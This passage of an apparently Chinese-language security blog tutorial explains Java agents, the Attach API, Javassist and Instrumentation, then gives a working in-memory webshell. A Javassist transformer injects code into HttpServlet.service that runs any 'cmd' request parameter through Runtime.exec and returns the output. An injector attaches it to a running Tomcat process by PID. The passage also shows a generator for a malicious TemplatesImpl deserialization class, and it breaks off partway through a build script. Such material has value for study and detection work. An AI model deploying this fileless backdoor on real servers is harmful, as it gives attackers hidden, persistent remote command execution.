Can-Redefine-Classes: true Can-Retransform-Classes: true Can-Set-Native-Method-Prefix: true Created-By: Manual Compilation ​\n创建测试主程序 java\r1 2 3 4 5 6 7 //package com.test; public class HelloAgent { public static void main(String[] args) { System.out.println(\u0026#34;Hello Agent!\u0026#34;); } } plain\r1 2 3 Manifest-Version: 1.0 Main-Class: HelloAgent Created-By: Manual Compilation 目录结构： 编译 创建俩个文件夹，\ntext\r1 javac HelloAgent.java 创建Agent JAR文件 text\r1 2 jar cfm ..\\dist\\agent.jar ..\\src\\main\\resources\\MANIFEST.MF JavaAgentPremain.class jar cfm ..\\dist\\hello.jar ..\\src\\main\\resources1\\MANIFEST.MF HelloAgent.class 测试运行 text\r1 java -javaagent:agent.jar -jar hello.jar 4.1.2 agentmain-Agent agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。\npremain方法在JDK1.5中提供，在JDK版本为1.5时，开发者只能在main加载之前添加手脚，但是对于大部分内存马注入时，都是JVM已经运行的情况下。在JDK1.6中实现了attach-on-demand，我们可以使用AttachAPI动态的加载Agent，agentmain能够在JVM启动后加载并实现相应的修改字节码的功能。\nAttachAPI在tool.jar中，而JVM启动时默认不加载该依赖，需要我们在classpath中额外进行指定\nVirtualMachine VirtualMachine 可以实现获取 JVM 信息、内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。\n该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法\njava\r1 2 3 4 5 6 7 8 //允许我们传入一个JVM的PID，然后远程连接到该JVM上 VirtualMachine.attach() //向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理 VirtualMachine.loadAgent() //获得当前所有的JVM列表 VirtualMachine.list() //解除与特定JVM的连接 VirtualMachine.detach() VirtualMachineDescriptor 类 com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例\n示例：\npom.xml:\nMissing artifact com.sun:tools:jar:1.8.0有效解决办法（亲测）-CSDN博客\nxml\r1 2 3 4 5 6 7 8 9 10 \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/com.sun/tools --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.0_451\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;system\u0026lt;/scope\u0026gt; \u0026lt;systemPath\u0026gt;${JAVA_HOME}/lib/tools.jar\u0026lt;/systemPath\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.test; import java.util.List; import com.sun.tools.attach.VirtualMachine; import com.sun.tools.attach.VirtualMachineDescriptor; public class get_PID { public static void main(String[] args) { List\u0026lt;VirtualMachineDescriptor\u0026gt; list = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : list) { if(vmd.displayName().equals(\u0026#34;com.test.get_PID\u0026#34;)) { System.out.println(vmd.id()); } } } } 实现 agentmain-Agent 编写一个 Sleep_Hello类，模拟正在运行的 JVM\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 package com.test; import static java.lang.Thread.sleep; public class SleepHello { public static void main(String[] args) throws InterruptedException { while(true){ System.out.println(\u0026#34;hello\u0026#34;); sleep(5000); } } } 编写JavaAgentAgentmain\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.agentmain.agent; import java.lang.instrument.Instrumentation; import static java.lang.Thread.sleep; public class JavaAgentAgentmain { public static void agentmain(String agentArgs, Instrumentation inst) throws InterruptedException { while(true){ System.out.println(\u0026#34;agentmain-Agent\u0026#34;); sleep(3000); } } } 配置 MANIFEST.MF 文件\nplain\r1 2 3 4 5 Manifest-Version: 1.0 Agent-Class: com.agentmain.agent.JavaAgentAgentmain Can-Redefine-Classes: true Can-Retransform-Classes: true Can-Set-Native-Method-Prefix: true 之后编译得到 Agentmain.jar\n编写测试类Inject_Agent，可以将agent注入到正在运行的JVM中\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package com.test; import com.sun.tools.attach.*; import java.io.IOException; import java.util.List; public class InjectAgent { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException { //调用VirtualMachine.list()获取正在运行的JVM列表 List\u0026lt;VirtualMachineDescriptor\u0026gt; list = VirtualMachine.list(); String path=\u0026#34;D:\\\\JavaCode\\\\内存马\\\\JavaAgentTest\\\\dist\\\\Agentmain.jar\u0026#34;; for(VirtualMachineDescriptor vmd : list){ System.out.println(vmd.displayName()); //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent if(vmd.displayName().contains(\u0026#34;Sleep\u0026#34;)){ //连接指定JVM VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id()); //加载Agent virtualMachine.loadAgent(path); //断开JVM连接 virtualMachine.detach(); } } } } 先运行 SleepHello.java 再运行\tInjectAgent.java\n4.2 动态修改字节码 4.2.1 Javassist 用来处理Java字节码的类库，允许在已经编译好的类中添加新的方法，或者修改已有的方法，同时也可以通过手动的方式去生成一个新的类对象\n简介 Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。\n类池 ClassPool ClassPool是 CtClass 对象的容器。它按需读取类文件来构造 CtClass 对象，并且保存 CtClass 对象以便以后使用。需要注意的是 ClassPool 会在内存中维护所有被它创建过的 CtClass，当 CtClass 数量过多时，会占用大量的内存，API 中给出的解决方案是有意识的调用 CtClass 的 detach() 方法以释放内存。\n主要方法有以下几个：\ngetDefault：获取默认的 ClassPool 对象。 get、getCtClass：根据类名获取 CtClass 对象，用于操作类的字节码。 makeClass：创建一个新的 CtClass 对象，用于新增类。 insertClassPath、appendClassPath：插入类搜索路径，提供给类加载器用于加载类。 toClass：将修改后的 CtClass 加载至当前线程的上下文类加载器中。通过调用 CtClass 的 toClass() 方法实现了将 CtClass 转换为 Class 对象，这样就可以在运行时使用这个类。需要注意的是一旦调用该方法，则无法继续修改已经被加载的 Class 对象。 获得方法如下：\n通过ClassPool.getDefault()使用JVM的类搜索路径。如果程序运行在JBoss或者Tomcat的Web服务器上，则ClassPool可能无法找到用户的类，因为Web服务器会使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的搜索路径\njava\r1 2 3 4 //获得方法 ClassPool cp = ClassPool.getDefault(); //添加类搜索路径 cp.insertClassPath(new ClassClassPath(\u0026lt;Class\u0026gt;)); CtClass CtClass 是 Javassist 中的一个抽象类，用于表示一个类文件。\nCtClass 需要关注的方法：\nfreeze：冻结一个类，使其不可修改。 isFrozen：判断一个类是否已被冻结。 prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用。 defrost：解冻一个类，使其可以被修改。如果事先知道一个类会被 defrost ， 则禁止调用 prune 方法。 detach：将该 class 从 ClassPool 中删除。 setSuperclass：设置当前类的父类。 writeFile：将 CtClass 对象转换为类文件并将其写入本地磁盘。 toClass：通过类加载器加载该 CtClass ，示例：Class clazz = cc.toClass(); 。 toBytecode：获取 CtClass 的字节码，示例：byte[] b = cc.toBytecode(); 。 可以通过以下代码获取\njava\r1 ClassPool.get(ClassName) CtMethod 和 CtField CtMethod 和 CtField 分别代表 Java 类中的方法和字段。通过 CtClass 对象，可以获取、添加、删除或修改类中的方法和字段。这些对象提供了丰富的 API ，用于操作方法和字段的各种属性，如访问修饰符、名称、返回类型等。\nCtMethod 中的一些重要方法：\ninsertBefore：在方法的起始位置插入代码。 insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到 exception 。 insertAt：在指定的位置插入代码。 setBody：将方法的内容设置为要写入的代码，当方法被 abstract 修饰时，该修饰符被移除。 make：创建一个新的方法。 利用 CtMethod 中的 insertBefore，insterAfter，insertAt 等方法可以实现 AOP 增强功能。\n通过CtClass.getDeclaredMethod(MethodName)获取，其中该类提供了一些方法可以让我们直接修改方法体，方法如下。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public final class CtMethod extends CtBehavior { } public abstract class CtBehavior extends CtMethod { //设置方法体 public void setBody(String src); // 插入在方法体最前面 public void insertBefore(String src); // 插入在方法体最后面 public void insertAfter(String src); // 在方法体的某一行插入内容 public int insertAt(int lineNum, String src); } 其中传递给insertBefore、insertAfter和insertAt的String对象是由Javassist的编译器进行编译的。该编译器支持语言的扩展，以下以$符号开头的几个标识符具有特殊的含义：\nJavassist 使用 依赖：\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.27.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 使用 javassist 创建一个 Person 类\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package com.test; import javassist.*; public class JavassistDemo { public static void CreatePerson() throws Exception{ //获取 CtClass 对象容器 ClassPool ClassPool classPool = ClassPool.getDefault(); //创建一个新类 Javassist.Learning.Person CtClass ctClass = classPool.makeClass(\u0026#34;javassist.Person\u0026#34;); //创建一个 Person 类的属性 name CtField ctField1 = new CtField(classPool.get(\u0026#34;java.lang.String\u0026#34;),\u0026#34;name\u0026#34;, ctClass); //设置属性访问符 ctField1.setModifiers(Modifier.PRIVATE); //将属性添加到 Person中，并设置初始值 ctClass.addField(ctField1,CtField.Initializer.constant(\u0026#34;aaa\u0026#34;)); //向 Person 类中添加 setter 和 getter 方法 ctClass.addMethod(CtNewMethod.setter(\u0026#34;setName\u0026#34;,ctField1)); ctClass.addMethod(CtNewMethod.getter(\u0026#34;getName\u0026#34;,ctField1)); //创建一个无参构造 CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass); //设置方法体 ctConstructor.setBody(\u0026#34;{name = \\\u0026#34;aaa\\\u0026#34;;}\u0026#34;); //向 Person 类中添加无参构造 ctClass.addConstructor(ctConstructor); //创建一个类方法 printName CtMethod ctMethod = new CtMethod(CtClass.voidType, \u0026#34;printName\u0026#34;, new CtClass[]{}, ctClass); //设置方法访问符 ctMethod.setModifiers(Modifier.PUBLIC); //设置方法体 ctMethod.setBody(\u0026#34;{System.out.println(\\\u0026#34;Hello World\\\u0026#34;);}\u0026#34;); //将方法添加至 Person 中 ctClass.addMethod(ctMethod); //将生成的字节码写入文件中 ctClass.writeFile(); } public static void main(String[] args) throws Exception { System.out.println(\u0026#34;start\u0026#34;); CreatePerson(); System.out.println(\u0026#34;finish\u0026#34;); } } 创建好的 Person.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package javassist; public class Person { private String name = \u0026#34;aaa\u0026#34;; public void setName(String var1) { this.name = var1; } public String getName() { return this.name; } public Person() { super(); this.name = \u0026#34;aaa\u0026#34;; } public void printName() { System.out.println(\u0026#34;Hello World\u0026#34;); } } 使用Javassist生成恶意class 从字节码层面生成恶意 class ，跳过恶意类的编译过程\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package com.javassist; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import java.io.File; import java.io.FileOutputStream; public class createShell { /** * 生成包含恶意命令的TemplatesImpl字节码 * @param cmd 要执行的系统命令 * @return 生成的字节码数组 */ public static byte[] getTemplatesImpl(String cmd) { try { // 获取默认的类池 ClassPool classPool = ClassPool.getDefault(); // 创建一个新的类，名为\u0026#34;Evil\u0026#34; CtClass ctClass = classPool.makeClass(\u0026#34;Evil\u0026#34;); // 获取AbstractTranslet类作为父类 // 这是XSLT转换器的基类，常用于Java反序列化利用 CtClass superClass = classPool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;); ctClass.setSuperclass(superClass); // 创建类的初始化构造函数 CtConstructor ctConstructor = ctClass.makeClassInitializer(); // 在构造函数体中插入执行系统命令的代码 ctConstructor.setBody(\u0026#34;try{\\n\u0026#34; + \u0026#34; Runtime.getRuntime().exec(\\\u0026#34;\u0026#34; + cmd + \u0026#34;\\\u0026#34;);\\n\u0026#34; + // 执行传入的命令 \u0026#34; }catch (Exception e){\\n\u0026#34; + \u0026#34; }\u0026#34;); // 异常处理，静默失败 // 将CtClass转换为字节数组 byte[] bytes = ctClass.toBytecode(); // 从类池中分离该类，释放资源 ctClass.detach(); return bytes; } catch (Exception e) { e.printStackTrace(); return new byte[]{}; } } /** * 将生成的恶意类字节码写入文件 * @throws Exception */ public static void writeShell() throws Exception { // 生成执行calc命令的恶意字节码 byte[] shell = createShell.getTemplatesImpl(\u0026#34;calc\u0026#34;); // 创建文件输出流，将字节码写入bbb.class文件 FileOutputStream fileOutputStream = new FileOutputStream(new File(\u0026#34;bbb.class\u0026#34;)); fileOutputStream.write(shell); // 注意：这里应该关闭流，建议使用try-with-resources fileOutputStream.close(); } /** * 主方法 - 程序入口 * @param args 命令行参数 * @throws Exception */ public static void main(String[] args) throws Exception { writeShell(); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; public class Evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (Exception var1) { } } public Evil() { super(); } } 4.2.2 Instrumentation 动态修改字节码 Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。\n其在Java中是一个接口，常用方法如下\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public interface Instrumentation { //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 void addTransformer(ClassFileTransformer transformer); //删除一个类转换器 boolean removeTransformer(ClassFileTransformer transformer); //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 void retransformClasses(Class\u0026lt;?\u0026gt;... classes) throws UnmodifiableClassException; //判断一个类是否被修改 boolean isModifiableClass(Class\u0026lt;?\u0026gt; theClass); // 获取目标已经加载的类。 @SuppressWarnings(\u0026#34;rawtypes\u0026#34;) Class[] getAllLoadedClasses(); //获取一个对象的大小 long getObjectSize(Object objectToSize); } 获取目标JVM已加载类 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.test; import java.lang.instrument.Instrumentation; public class Java_Agent_agentmain_Instrumentation { public static void agentmain(String args, Instrumentation inst) throws InterruptedException{ Class[] classes = inst.getAllLoadedClasses(); for(Class cls : classes){ System.out.println(\u0026#34;=======================\u0026#34;); System.out.println(\u0026#34;加载类：\u0026#34; + cls.getName()); System.out.println(\u0026#34;是否可被修改：\u0026#34; + inst.isModifiableClass(cls)); } } } plain\r1 2 3 4 5 Manifest-Version: 1.0 Agent-Class: com.test.Java_Agent_agentmain_Instrumentation Can-Redefine-Classes: true Can-Retransform-Classes: true Can-Set-Native-Method-Prefix: true 创建 jar\ntext\r1 jar cvfm Instrumentation.jar ..\\src\\main\\resources\\MANIFEST.MF .\\Java_Agent_agentmain_Instrumentation.class 使用 InjectAgent.java 测试\n能够获取目标JVM已加载类\ntransform - 转换器 在Instrumentation接口中，我们可以通过**addTransformer()**来添加一个transformer（转换器），关键属性就是ClassFileTransformer类。\njava\r1 2 //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); ClassFileTransformer接口中只有一个**transform()**方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。\n在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。\n当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。\n转换将按以下顺序应用：\nplain\r1 2 3 4 不可重转换转换器 不可重转换本机转换器 可重转换转换器 可重转换本机转换器 至于transformer中对字节码的具体操作，则需要使用到Javassisit类。\nInstrumentation的局限性 大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：\npremain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。\n类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：\n新类和老类的父类必须相同 新类和老类实现的接口数也要相同，并且是相同的接口 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致 新类和老类新增或删除的方法必须是private static/final修饰的 可以修改方法体 4.3 Agent 内存马注入 看了许多师傅关于Agent内存马注入的文章和博客，各有千秋，利用方式也各不相同。现在，我根据自己的理解来编写一个小demo。\n4.3.1 方式一（后续可能会复现其他师傅的利用方式） 思路： 编译并打包 AgentMemShell 为 agentmemshell.jar。 编译 Injector（需要 tools.jar，通常在 JAVA_HOME/lib/ 下）。 运行 Injector，指定目标 Tomcat 的 PID。 访问任何 Servlet 路径，带上 ?cmd=whoami 参数，即可执行命令。 可用 Demo： 目录结构： pom.xml java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.src\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;Demo01\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;maven.compiler.source\u0026gt;1.8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;1.8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- 编译插件 --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.8.1\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;1.8\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;1.8\u0026lt;/target\u0026gt; \u0026lt;encoding\u0026gt;UTF-8\u0026lt;/encoding\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- 打包 JAR 插件 --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-jar-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;!-- 确保生成标准 MANIFEST 文件 --\u0026gt; \u0026lt;manifest\u0026gt; \u0026lt;addClasspath\u0026gt;true\u0026lt;/addClasspath\u0026gt; \u0026lt;useUniqueVersions\u0026gt;false\u0026lt;/useUniqueVersions\u0026gt; \u0026lt;/manifest\u0026gt; \u0026lt;!-- 这里写入 Agent 属性 --\u0026gt; \u0026lt;manifestEntries\u0026gt; \u0026lt;Agent-Class\u0026gt;com.src.agent.AgentMain\u0026lt;/Agent-Class\u0026gt; \u0026lt;Can-Redefine-Classes\u0026gt;true\u0026lt;/Can-Redefine-Classes\u0026gt; \u0026lt;Can-Retransform-Classes\u0026gt;true\u0026lt;/Can-Retransform-Classes\u0026gt; \u0026lt;/manifestEntries\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; AgentMemShell.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package com.src.agent; import java.lang.instrument.Instrumentation; public class AgentMemShell { public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(\u0026#34;AgentMemShell Injected!\u0026#34;); // 添加类转换器 inst.addTransformer(new ServletTransformer(), true); // 找到所有已加载的 HttpServlet 类并进行重转换 Class[] loadedClasses = inst.getAllLoadedClasses(); for (Class clazz : loadedClasses) { if (clazz.getName().equals(\u0026#34;javax.servlet.http.HttpServlet\u0026#34;)) { try { System.out.println(\u0026#34;Found HttpServlet:\u0026#34;+clazz); inst.retransformClasses(clazz); System.out.println(\u0026#34;Retransform HttpServlet Success.\u0026#34;); } catch (Exception e) { e.printStackTrace(); } break; } } } public static void premain(String agentArgs, Instrumentation inst) { agentmain(agentArgs, inst); } } ServletTransformer.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 package com.src.agent; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import javassist.LoaderClassPath; import java.lang.instrument.ClassFileTransformer; import java.security.ProtectionDomain; public class ServletTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { try { // 打印所有被加载的类，便于调试（仅第一次注入时启用） if (className != null \u0026amp;\u0026amp; className.contains(\u0026#34;servlet\u0026#34;)) { System.out.println(\u0026#34;[Debug] Loading class: \u0026#34; + className); } // className 可能是 \u0026#34;javax/servlet/http/HttpServlet\u0026#34; // 也可能是 \u0026#34;javax.servlet.http.HttpServlet\u0026#34; String dotName = className.replace(\u0026#39;/\u0026#39;, \u0026#39;.\u0026#39;); // 精确匹配 HttpServlet 类 if (\u0026#34;javax.servlet.http.HttpServlet\u0026#34;.equals(dotName)) { System.out.println(\u0026#34;[+] Found target class: \u0026#34; + dotName); System.out.println(\u0026#34;[+] Start transforming HttpServlet...\u0026#34;); // 初始化 Javassist ClassPool 并添加当前 ClassLoader 的路径 ClassPool classPool = ClassPool.getDefault(); if (loader != null) { classPool.insertClassPath(new LoaderClassPath(loader)); } // 获取类定义 CtClass ctClass = classPool.get(dotName); CtMethod serviceMethod = ctClass.getDeclaredMethod(\u0026#34;service\u0026#34;); // 恶意逻辑 String shell = \u0026#34;\u0026#34; + \u0026#34;{\u0026#34; + \u0026#34; javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;\u0026#34; + \u0026#34; javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;\u0026#34; + \u0026#34; String cmd = req.getParameter(\\\u0026#34;cmd\\\u0026#34;);\u0026#34; + \u0026#34; if (cmd != null) {\u0026#34; + \u0026#34; try {\u0026#34; + \u0026#34; java.util.Scanner s = new java.util.Scanner(\u0026#34; + \u0026#34; Runtime.getRuntime().exec(cmd).getInputStream(), \\\u0026#34;UTF-8\\\u0026#34;\u0026#34; + \u0026#34; ).useDelimiter(\\\u0026#34;\\\\\\\\A\\\u0026#34;);\u0026#34; + \u0026#34; String output = s.hasNext() ? s.next() : \\\u0026#34;\\\u0026#34;;\u0026#34; + \u0026#34; res.setContentType(\\\u0026#34;text/plain;charset=UTF-8\\\u0026#34;);\u0026#34; + \u0026#34; res.getWriter().write(output);\u0026#34; + \u0026#34; res.getWriter().flush();\u0026#34; + \u0026#34; return;\u0026#34; + \u0026#34; } catch (Exception e) {\u0026#34; + \u0026#34; e.printStackTrace();\u0026#34; + \u0026#34; }\u0026#34; + \u0026#34; }\u0026#34; + \u0026#34;}\u0026#34;; // 在 service 方法的开头插入 serviceMethod.insertBefore(shell); byte[] newClassBytes = ctClass.toBytecode(); ctClass.detach(); System.out.println(\u0026#34;[+] HttpServlet Transformed Complete.\u0026#34;); return newClassBytes; } } catch (Throwable e) { System.out.println(\u0026#34;[!] Transform failed: \u0026#34; + e); e.printStackTrace(); } // 返回 null 表示不修改该类 return null; } } Injector.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.src.injector; import com.sun.tools.attach.VirtualMachine; import com.sun.tools.attach.VirtualMachineDescriptor; import java.util.List; public class Injector { public static void main(String args[]) throws Exception{ if (args.length \u0026lt; 2) { System.out.println(\u0026#34;Usage: java -jar injector.jar \u0026lt;pid\u0026gt; \u0026lt;agent_jar_path\u0026gt;\u0026#34;); System.out.println(\u0026#34;Available JVM processes:\u0026#34;); listProcesses(); return; } String pid = args[0]; String agentJarPath = args[1]; try { System.out.println(\u0026#34;Trying to attach to PID: \u0026#34; + pid); VirtualMachine vm = VirtualMachine.attach(pid); vm.loadAgent(agentJarPath); vm.detach(); System.out.println(\u0026#34;[+] Agent injected successfully!\u0026#34;); } catch (Exception e) { System.err.println(\u0026#34;[-] Injection failed: \u0026#34; + e.getMessage()); e.printStackTrace(); } } private static void listProcesses() { try { List\u0026lt;VirtualMachineDescriptor\u0026gt; vmList = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : vmList) { System.out.println(\u0026#34;PID: \u0026#34; + vmd.id() + \u0026#34; - \u0026#34; + vmd.displayName()); } } catch (Exception e) { System.err.println(\u0026#34;[-] Failed to list processes: \u0026#34; + e.getMessage()); } } } MANIFEST.MF plain\r1 2 3 4 5 6 7 Manifest-Version: 1.0 Agent-Class: com.src.agent.AgentMemShell Can-Redefine-Classes: true Can-Retransform-Classes: true Built-By: maven Created-By: Apache Maven Build-Jdk: 1.8.0_65 这是 一个小脚本：\nbuild.bat (部分内容根据实际情况自行修改)\nbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 @echo off setlocal echo Setting up environment... set JAVA_HOME=D:\\Java\\jdk1.8.0_65 set PATH=%JAVA_HOME%\\bin;%PATH% echo [1/6] Cleaning target directory... if exist target rmdir /s /q target mkdir target mkdir target\\classes echo [2/6] Compiling agent classes... \u0026#34;%JAVA_HOME%\\bin\\javac\u0026#34; -encoding UTF-8 -cp \u0026#34;lib\\javassist.jar\u0026#34; -d target\\classes src\\main\\java\\com\\src\\agent\\*.java if errorlevel 1 ( echo Failed to compile agent classes! pause exit /b 1 ) echo [3/6] Compiling injector class... \u0026#34;%JAVA_HOME%\\bin\\javac\u0026#34; -encoding UTF-8 -cp \u0026#34;D:\\Java\\jdk1.8.0_65\\lib\\tools.jar;target\\classes\u0026#34; -d target\\classes src\\main\\java\\com\\src\\injector\\*.java if errorlevel 1 ( echo Failed to compile injector class! pause exit /b 1 ) echo [4/6] Merging javassist into classes... pushd target\\classes \u0026#34;%JAVA_HOME%\\bin\\jar\u0026#34; xf ..\\..\\lib\\javassist.jar popd echo 